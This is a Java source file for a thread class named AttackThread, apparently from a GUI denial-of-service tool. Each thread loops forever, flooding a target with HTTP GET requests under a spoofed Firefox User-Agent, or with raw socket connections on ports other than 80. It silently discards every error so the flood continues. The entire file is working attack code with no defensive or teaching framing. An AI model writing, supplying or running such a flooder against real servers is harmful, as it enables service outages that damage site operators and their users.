package dosattackergui;
import java.net.*; 
import java.util.logging.Level;
import java.util.logging.Logger;
public class AttackThread extends Thread
{
	String addr;
	int port;
        private URL url;
        boolean HTTP_ATTACK=false;
	AttackThread(String addr,int port)
	{
            this.addr=addr;
            this.port=port;
            if(port==80)
                HTTP_ATTACK=true;
            try {
                this.url = new URL(addr);
            } catch (MalformedURLException ex) {
               //ex.printStackTrace();
            }
        }
	public void run()
	{
		for(;;)
		{	
			try{
                        if(HTTP_ATTACK)
                            httpAttack();
                        else // Generic Attack to aim any protocol based server
                            new Socket(addr,port);		
			}
			catch(Exception e){}
		}
	}
        public void httpAttack()
        {
            try{
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setDoOutput(true);
                connection.setDoInput(true);
                connection.setRequestMethod("GET");
                connection.setRequestProperty("charset", "utf-8");
                connection.setRequestProperty("Host", "localhost");
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                //connection.setRequestProperty("Content-Length", param);
                //System.out.println(this + " " + connection.getResponseCode());
                int resCode = connection.getResponseCode();
                connection.getInputStream();
            }catch(Exception e)
            {}
            
        }
} 
